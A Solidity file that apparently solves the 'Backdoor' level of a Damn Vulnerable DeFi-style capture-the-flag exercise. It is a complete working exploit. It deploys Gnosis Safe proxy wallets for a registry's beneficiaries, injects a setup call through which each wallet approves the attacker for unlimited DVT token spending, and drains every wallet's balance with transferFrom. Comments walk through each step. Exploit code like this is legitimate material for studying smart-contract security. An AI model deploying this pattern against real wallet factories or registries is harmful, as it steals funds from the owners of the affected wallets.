// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
//import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../backdoor/WalletRegistry.sol";
//beneficiaries are just unclaimed wallets 
//make wallets for them and include backdoor Approve spending limit for wallets


contract MaliciousApproval{
    function approve (address attacker, IERC20 token) public{
        //approves attacker for max quantity of DVT token 
        token.approve(attacker, type(uint256).max);
    }
}
contract BackdoorAttack{
    WalletRegistry private immutable WalletReg;
    GnosisSafeProxyFactory private immutable GnosisFactory;
    GnosisSafe private immutable MasterCopy;
    IERC20 private immutable token;
    MaliciousApproval private immutable maliciousApproval;

    constructor(address _walletReg, address[] memory users ){
        //global variable setup
        WalletReg = WalletRegistry(_walletReg);
        MasterCopy = GnosisSafe(payable(WalletReg.masterCopy()));
        GnosisFactory = GnosisSafeProxyFactory(WalletReg.walletFactory());
        token = IERC20(WalletReg.token());

        //create new malicious approval contract to add to the initialization of our wallets - this contract approves us to spend all the token in the wallet
        maliciousApproval = new MaliciousApproval();

        //creating the variables we need to set the initialization data of the GnosisSafe
        bytes memory initializer;
        address[] memory owners = new address[](1);
        address userWallet;

        //Setting up our initialization data for the safe, adding the backdoor via GnosisSafe::Setup -> @param data and @param to, creating the user/beneficiary wallet, and taking all tokens from them via back door
        for (uint256 i; i<users.length; i++){
            owners[0] = users[i];
            initializer = abi.encodeCall(GnosisSafe.setup, 
            (owners, 1, address(maliciousApproval),abi.encodeCall(maliciousApproval.approve, (address(this), token)), address(0), address(0), 0, payable(address(0))));
            userWallet = address( GnosisFactory.createProxyWithCallback(address(MasterCopy), initializer,0,WalletReg));
            token.transferFrom(userWallet, msg.sender, token.balanceOf(userWallet));
        }


    }




}